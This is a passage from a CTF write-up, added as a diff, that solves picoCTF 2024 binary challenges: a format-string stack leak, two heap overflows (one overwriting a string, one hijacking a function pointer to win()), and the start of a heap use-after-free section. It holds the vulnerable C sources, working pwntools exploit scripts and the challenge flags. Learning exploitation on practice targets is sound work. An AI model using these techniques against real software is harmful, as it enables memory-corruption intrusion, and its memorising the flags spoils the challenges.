@@ -2172,10 +2172,387 @@ if __name__ == '__main__':
     main()
 ```
 
+Running it works and I got the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/8a58b11b-be08-453e-8960-0f7e5191f7cb)
+
+```
+Flag: picoCTF{my_first_heap_overflow_76775c7c}
+```
+
+#### Format String 1
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/180971da-3435-40a8-bf57-004fb72b5750)
+
+Same as usual we are given the source code
+
+Here's the source code
+
+```c
+#include <stdio.h>
 
 
+int main() {
+  char buf[1024];
+  char secret1[64];
+  char flag[64];
+  char secret2[64];
+
+  // Read in first secret menu item
+  FILE *fd = fopen("secret-menu-item-1.txt", "r");
+  if (fd == NULL){
+    printf("'secret-menu-item-1.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(secret1, 64, fd);
+  // Read in the flag
+  fd = fopen("flag.txt", "r");
+  if (fd == NULL){
+    printf("'flag.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(flag, 64, fd);
+  // Read in second secret menu item
+  fd = fopen("secret-menu-item-2.txt", "r");
+  if (fd == NULL){
+    printf("'secret-menu-item-2.txt' file not found, aborting.\n");
+    return 1;
+  }
+  fgets(secret2, 64, fd);
+
+  printf("Give me your order and I'll read it back to you:\n");
+  fflush(stdout);
+  scanf("%1024s", buf);
+  printf("Here's your order: ");
+  printf(buf);
+  printf("\n");
+  fflush(stdout);
+
+  printf("Bye!\n");
+  fflush(stdout);
+
+  return 0;
+}
+```
+
+First it opens up the file `secret-menu-item-1.txt` and stores the content to `secret1`, then it opens up the flag file and store the content to `flag` and finally opens up `secret-menu-item-2.txt` and stores the content to `secret2`
+
+Next it receives our input using `scanf` and we can read in 1024 bytes which is stored in `buf` 
+
+And lastly it prints out our input using `printf` without using a format specifier
+
+So the vulnerability here is format string bug
+
+And the goal is to get the flag which is stored on the stack
+
+We can leak it using `%p` and also make use of `%{offset}$p` to leak values at specified offset
+
+I wrote a script to achieve this
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%201/solve.py)
+
+```python
+from pwn import *
+
+context.log_level = 'info'
+
+flag = ''
+
+for i in range(0, 20):
+    try:
+        # io = remote('mimas.picoctf.net', 63564, level='warn')
+        io = process("./format-string-1")
+        io.recvuntil(':')
+        io.sendline('%{}$p'.format(i).encode())
+        io.recvuntil('order: ')
+        result = io.recvline()
+        if not b'nil' in result:
+            print(str(i) + ': ' + str(result))
+            try:
+                decoded = unhex(result.strip().decode()[2:])
+                reversed_hex = decoded[::-1]
+                print(str(reversed_hex))
+                flag += reversed_hex.decode()
+            except BaseException:
+                pass
+        io.close()
+    except EOFError:
+        io.close()
+
+info(flag)
+```
+
+Running it gives the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/57a87b65-b663-4e8f-897f-3d48376e10e2)
+
+```
+Flag: picoCTF{4n1m41_57y13_4x4_f14g_50396c64}
+```
+
+#### Heap 1
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4341eb9d-52e9-4156-9c56-667b256a1612)
+
+This was the same code as the previous one (heap 0) except that this time the `check_win` function performs operation differently
+
+You can take a look at the source code [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%201/source.c)
+
+Here's the difference:
+
+```c
+void check_win() {
+    if (!strcmp(safe_var, "pico")) {
+        printf("\nYOU WIN\n");
+
+        // Print flag
+        char buf[FLAGSIZE_MAX];
+        FILE *fd = fopen("flag.txt", "r");
+        fgets(buf, FLAGSIZE_MAX, fd);
+        printf("%s\n", buf);
+        fflush(stdout);
+
+        exit(0);
+    } else {
+        printf("Looks like everything is still secure!\n");
+        printf("\nNo flage for you :(\n");
+        fflush(stdout);
+    }
+}
+```
+
+This time around it checks if the `safe_var` equals `pico`
+
+That means instead of us overwriting it with junk we should overwrite it to `pico`
+
+The offset was still 32 and with that said here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%201/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('chall')
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
 
 
+def write(data):
+    io.sendline("2")
+    io.sendafter("buffer:", data)
+
+def solve():
+    write(b'A'*0x20+p64(u32("pico")))
+    io.sendline('4')
+    io.sendline('4')
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it gives the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fd7af675-d4e4-40a5-9f63-5354f2ef7c2d)
+
+```
+Flag: picoCTF{starting_to_get_the_hang_e9fbcea5}
+```
+
+#### Heap 2
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9769037a-e5c6-42b8-931b-1c3c8ad72c28)
+
+Almost similar to the previous ones but this time around we it's this:
+
+```c
+int num_allocs;
+char *x;
+char *input_data;
+
+void win() {
+    // Print flag
+    char buf[FLAGSIZE_MAX];
+    FILE *fd = fopen("flag.txt", "r");
+    fgets(buf, FLAGSIZE_MAX, fd);
+    printf("%s\n", buf);
+    fflush(stdout);
+
+    exit(0);
+}
+
+void check_win() { ((void (*)())*(int*)x)(); }
+
+void init() {
+
+    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
+    fflush(stdout);
+
+    input_data = malloc(5);
+    strncpy(input_data, "pico", 5);
+    x = malloc(5);
+    strncpy(x, "bico", 5);
+}
+```
+
+So it allocates memory of size 5 on the heap where the pointer is stored in `x` and then it moves `bico` to `x` and also `input_data` stores the heap pointer returned by malloc where the size allocated is 5
+
+Our goal is to overwrite the value of `bico` to what?
+
+The check_win condition for this challenge is that it casts the value of `x` as code meaning that it will `call` whatever value is stored in the heap pointer `x` making the program flow will continue from there
+
+Since PIE isn't enabled.......oops I haven't been doing that :(
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fad45c3b-b8d4-4d8d-8afc-2127e53a8386)
+
+We can therefore overwrite the value of `bico` to the address of the `win` function so that when we use option `4` it would give us the flag
+
+The offset is at 32 
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%202/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('chall')
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+
+def write(data):
+    io.sendline("2")
+    io.sendafter("buffer:", data)
+
+
+def solve():
+    write(b'B'*0x20+p64(exe.sym['win']))
+    io.sendline('4')
+    io.sendline('4')
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it gives the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/c3684a4f-172c-4ab8-88d7-d387344353c4)
+
+```
+Flag: picoCTF{and_down_the_road_we_go_856288fc}
+```
+
+#### Heap 1
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db9942f2-6ee0-4758-930c-15d2b4110167)
+
+This one actually took me some time because I wasn't familiar with "Heap exploitation" so the ones I did based on "Heap" were just based on me looking at the behaviour in gdb
+
+And that's how I exactly solved this one too :)
+
+This time around the source code is entirely different but yet similiar
+
+You can find the whole source code [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%203/source.c)
+
+Let's see what it does:
+
+First it creates a structure named `object` with 4 fields where each field is of type `char`, then it defines the pointer x which points to the structure created. In the `init` function it sets `x->flag` to `pico` 
+
+```c
+typedef struct {
+  char a[10];
+  char b[10];
+  char c[10];
+  char flag[5];
+} object;
+
+int num_allocs;
+object *x;
+
+void init() {
+
+    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
+    fflush(stdout);
+
+    x = malloc(sizeof(object));
+    strncpy(x->flag, "bico", 5);
+}
+```
+
+Now let's see the important option it provides
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/48fe1b9c-d71a-4a66-ae99-f3c20e50a314)
+
+We can allocate object and here's the code handling that
+
+```c
+void alloc_object() {
+    printf("Size of object allocation: ");
+    fflush(stdout);
+    int size = 0;
+    scanf("%d", &size);
+    char* alloc = malloc(size);
+    printf("Data for flag: ");
+    fflush(stdout);
+    scanf("%s", alloc);
+}
+```
+
+We can control the size of what we want to allocate and write to it. Using `scanf` it receives our input which is stored to the pointer we allocated without specifying the number of bytes we can read in causing a heap overflow
 
 
 
